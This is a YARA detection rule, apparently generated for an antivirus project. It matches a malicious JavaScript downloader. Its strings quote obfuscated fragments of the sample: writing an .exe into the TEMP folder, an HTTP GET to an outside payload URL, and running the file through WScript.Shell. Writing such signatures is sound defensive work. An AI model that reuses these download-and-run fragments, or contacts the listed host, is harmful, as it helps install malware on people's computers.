rule sig_20160329_7e751b4934001784d95ed00225749f5d {
  meta:
    description = "datamaliciousorder - file 20160329_7e751b4934001784d95ed00225749f5d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e9817a177dbefb77acbb36ca523eb72b70c8652888200fa2cf20176c1815c512"

  strings:
    $s1  = "function Rf() {return W[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"9E9Nlhjc5R2efr.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[SZ](J() * 11); if (Xo[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "Xo[gT](\"GET\", \"http://pasticceriabonci.it/m1psa\", false);" fullword ascii
    $s4  = "function Dv(v, Da){Nx = Nx * 1; return v - Da;};" fullword ascii
    $s5  = "var W = function Y() {return WScript[Am](\"WScript.Shell\");}(), FO = 11;" fullword ascii
    $s6  = "function h(){return \"\" + fp;};" fullword ascii
    $s7  = "function JZ(Ax){W[\"Run\"](Ax, Nx, Nx);};" fullword ascii
    $s8  = "function EC() {return ((GN == true) && (GN == Z)) ? 1 : Nx;};" fullword ascii
    $s9  = " while (k){" fullword ascii
    $s10 = "function bT()" fullword ascii
    $s11 = "function J(){return 22;};" fullword ascii
    $s12 = "function C(wB) {var R = (1, 2, 3, 4, 5, wB); return R;};" fullword ascii
    $s13 = "function rN(){return Am;};" fullword ascii
    $s14 = "return Dv(eX, E);" fullword ascii
    $s15 = "var tw = new this[\"Date\"]();" fullword ascii
    $s16 = "Z = true; " fullword ascii
    $s17 = "var Z = false;" fullword ascii
    $s18 = "var p = false;" fullword ascii
    $s19 = "var GN = false;" fullword ascii
    $s20 = "GN = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}